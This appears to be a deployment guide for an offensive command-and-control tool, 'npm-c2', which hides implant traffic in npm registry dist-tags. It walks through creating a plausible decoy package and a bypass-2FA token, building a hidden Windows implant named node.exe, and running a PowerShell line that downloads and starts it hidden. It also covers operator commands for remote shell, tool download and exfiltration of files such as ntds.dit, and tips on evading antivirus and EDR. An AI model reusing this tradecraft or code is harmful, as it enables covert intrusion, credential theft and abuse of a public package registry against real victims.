# Deployment for a real engagement

> Note: written for the dist-tag transport (v1.x). For the staging transport,
> which is what npm still allows to automation, see [README.md](README.md).

What you need for this channel to run commands reliably and in order, with what
has been verified against the real npm registry and what can only be checked in
your own deployment.

## 1. Account and package

1. An npmjs.com account (a dedicated one, not your personal account: the
   implant's token has write permission on that package).
2. `npm init -y` in an empty directory, a boring and plausible name
   (`npx-telemetry-collector`, `runtime-profiler`), then `npm publish`.
3. Bump the version once: the channel never touches the version, only the
   dist-tags.

## 2. Token: granular, not classic

Legacy tokens no longer exist (November 2025). What you need:

```sh
npm login
npm token create \
  --name "ci-$(date +%Y%m%d)" \
  --packages <pkg> \
  --packages-and-scopes-permission read-write \
  --bypass-2fa \
  --expires 2026-12-31
```

- `--packages <pkg>`: only that package. A leaked token touches nothing else.
- `--read-write`: without it the implant runs but cannot reply.
- `--bypass-2fa`: without it every PUT would ask for an OTP.
- `--expires`: keep it short. You are putting it inside a binary.
- `--cidr` if your jump host has a fixed IP. It is the best real mitigation for
  having the token in the implant.

The token must start with `npm_`. `npm-c2 doctor` checks it before you waste
time on a deployment.

**Expiry matters**: bypass-2FA tokens lose the ability to publish in January
2027. Dist-tag writes and reads are not affected by that change (what is being
retired is publishing new versions), but if the project has to last, rotate the
token every quarter.

## 3. Verify before deploying

```sh
npm-c2 doctor -p <pkg> -t npm_xxx
```

Against the real registry it does:

```
[ok  ] token shape                        npm_* granular token
[ok  ] package reachable (no auth)        7 tag(s), 361 ms
[ok  ] read latency                       361 ms per GET
[ok  ] token can write a dist-tag         PUT accepted
[ok  ] max tag name length                accepted 250 chars (MAX_TAG_LEN=250)
[ok  ] write visible to a reader          immediately
[+] ready: the implant can poll and reply
```

Every line is a real HTTP request, and it deletes its own test tags. If
something fails you get `FAIL` and exit code 2; if it only warns, 1.

This is what I **could** verify from this machine: unauthenticated reads take
361-376 ms and the `/-/package/<pkg>/dist-tags` endpoint returns
`cf-cache-status: DYNAMIC` (not cached by Cloudflare), while the full package
endpoint does return `HIT` with `max-age=300`. In other words: a write should be
visible on the next read, without the 60 s of cache the original README feared.
`doctor` confirms it against your own package instead of trusting this
measurement.

What I could **not** verify: a genuine authenticated PUT. I tested the six write
checks against a mock registry (`tests/mock_registry.py`) and
against documented behaviour (`npm/cli/lib/commands/dist-tag.js`, which uses
`PUT /-/package/<escapedName>/dist-tags/<encodeURIComponent(tag)>`).

## 4. Deploying the implant

```sh
# runs but does not reply  ->  blind actions only
npm-c2 --generate-standalone -p <pkg> > implant.py

# runs and replies  ->  the normal case
npm-c2 --generate-standalone -t npm_xxx -p <pkg> > implant.py

# binary (legacy Python builder)
pip install pyinstaller
build.bat npm_xxx <pkg>
```

The current path is the Go build (`native/build_go.py`); `build.bat` is kept
for hosts without a Go toolchain. It validates that the generated file parses
before calling PyInstaller, because it used to compile a traceback into
`node.exe` and call the build successful.

Running it on the target:

```powershell
powershell -c "iwr -Uri http://10.0.0.1/node.exe -OutFile $env:TEMP\node.exe; Start-Process $env:TEMP\node.exe -Arg '-p <pkg> --interval 30' -WindowStyle Hidden"
```

`--interval 30 --jitter 15` is a good starting point: a full cycle (GET +
execute + PUT) takes under a second, so 30 s leaves plenty of room without
looking like a beacon.

## 5. Usage: what changed to make it usable

Before, you had to `task` and then `poll` by hand. Now:

```sh
# console: type, receive the output
npm-c2 operator -p <pkg> -t npm_xxx shell

c2> whoami
desktop-7f3a\administrator
c2> cd:C:\Windows\Temp
cwd=C:\Windows\Temp
c2> bg:nmap -sV 10.0.0.0/24
job j1 started: nmap -sV 10.0.0.0/24
c2> out:j1
[j1 done 41s rc=0 :: nmap -sV 10.0.0.0/24]
Nmap scan report for 10.0.0.5 ...
```

And for scripting:

```sh
npm-c2 operator -p <pkg> -t npm_xxx run "ipconfig /all" > ipconfig.txt
npm-c2 operator -p <pkg> -t npm_xxx run --file collect.ps1 --timeout 600
```

`run` waits for the reply and returns exit code 3 if it times out.

## 6. Commands you need on a real engagement

| Need | Command |
|---|---|
| shell in the right directory | `cd:C:\Users\victim\Desktop` then the command |
| long task without blocking the beacon | `bg:nmap -sV -p- 10.0.0.0/24` + `out:j1` |
| collect a binary | `up:C:\Windows\Temp\out.zip` (12000 bytes per reply, use `up:path:off:len` for the rest) |
| upload a tool | `dl:http://10.0.0.1/tool.exe:C:\Windows\Temp\tool.exe` |
| PowerShell without breaking quotes | `ps:Get-ChildItem -Recurse $env:USERPROFILE` |
| large file in slices | `up:C:\Users\u\ntds.dit:0:12000`, then `:12000:12000`, and so on |

## 7. Before you leave

```sh
npm-c2 operator -p <pkg> -t npm_xxx clean --all   # leaves only latest
npm-c2 operator -p <pkg> -t npm_xxx stats         # 0 pending, 0 results
```

The implant deletes its own command tags after executing them (`AUTO_CLEAN`), so
the channel does not grow without control: the dist-tag map does not fill with
garbage and the GET does not degrade.

And revoke the token on npmjs.com when the engagement ends. It is the only
thing that really matters if the binary stays out there.

## 8. Limits that remain

- **The token lives in the binary.** Obfuscation is XOR with
  `SHA256(package)[:16]`; the package name is in the binary too, so the key is
  too. Whoever has the EXE has the token. A short, scoped token with CIDR is the
  only real mitigation.
- **Everything travels in clear inside TLS.** npm and Cloudflare see tag names
  and values. Do not put credentials or client data there.
- **One thread per implant.** A long command blocks the cycle; that is what
  `bg:` is for.
- **No end-to-end payload encryption** in the dist-tag channel. Base64 is not
  encryption; the staging transport does encrypt.
- **Windows is the tested target.** The code is cross-platform (it uses
  `/bin/sh` outside Windows) but the build and the `node.exe` metadata are
  Windows.

## 9. Why Go and not Python for the binary

The PyInstaller attempt built under Wine worked, but left a bug that only showed
up in practice: a `--noconsole` build has no console, and on Windows Python's
`subprocess` can fail waiting on an invalid process handle (`WinError 6`). The
implant *started and talked to the channel*, but returned the exception instead
of the command output. It could be worked around, but it is structural runtime
fragility, not a code bug.

The port to Go removes that whole class of problem:

| | Python + PyInstaller | Go |
|---|---|---|
| build time | ~45 s under Wine | **0.9 s** native |
| size | 7.9 MB | 6.6 MB (6.8 with resources) |
| dependencies on target | embedded runtime, VC DLLs | **none** (static) |
| `--noconsole` | fragile (WinError 6) | native, no console by design |
| cold start | ~1-2 s (unpacks to %TEMP%) | ~50 ms |
| icon / version | PyInstaller | `windres` (same result) |

The protocol is identical and verified by `tests/test_go_parity.py`: a Python
operator pushes tags and the Go implant executes and replies, and Python decodes
the answer. Both binaries are interchangeable on the channel.

```sh
python3 native/build_go.py -t npm_xxx -p <pkg>     # dist/node.exe
python3 native/build_go.py --32                     # dist/node-x86.exe
```

The port still keeps the Python path (`npm-c2`, `build.bat`,
`native/build_windows.py`) for hosts without a Go toolchain, but the normal path
is Go.

## 10. Binary size: UPX

The uncompressed Go exe is 6.8 MB (6.6 on 386). With UPX it drops to **2.3 MB**,
a third:

```sh
python3 native/build_go.py -p <pkg> -t <tok> --upx --32
#   [+] upx: 6,839,808 -> 2,368,512 bytes (34.6%)
```

Or in `c2.json`: `"upx": true`.

Verified that the compressed binary **still runs and replies** on the channel:
`tests/test_go_windows.py` passes with the packed exe, and the icon and version
resources survive (UPX compresses sections, not resources).

**The cost, which matters more than the megabytes:**

- A UPX-packed exe has `UPX0`/`UPX1` signatures visible in the header. Every
  engine flags it: Defender often labels it `Wacatac`/`Upatre`, and YARA has
  trivial rules for `UPX!`.
- High per-section entropy is itself a signal.
- It cannot be signed afterwards without breaking the stub.

With 2.3 MB you gain bandwidth and transfer speed; you lose discretion. For an
engagement where the binary is served from your own infrastructure and the
target has an EDR, **the 6.8 MB without UPX is better**: an unpacked Go binary
is much less interesting to an engine than a UPX one. For an exercise with no
EDR, or over SMB to an internal share, UPX is fine.

The intermediate option if you want a smaller size without the UPX signature
does not exist: removing `-H windowsgui` makes it worse, and `-ldflags "-s -w"`
is already set. UPX is what is left.
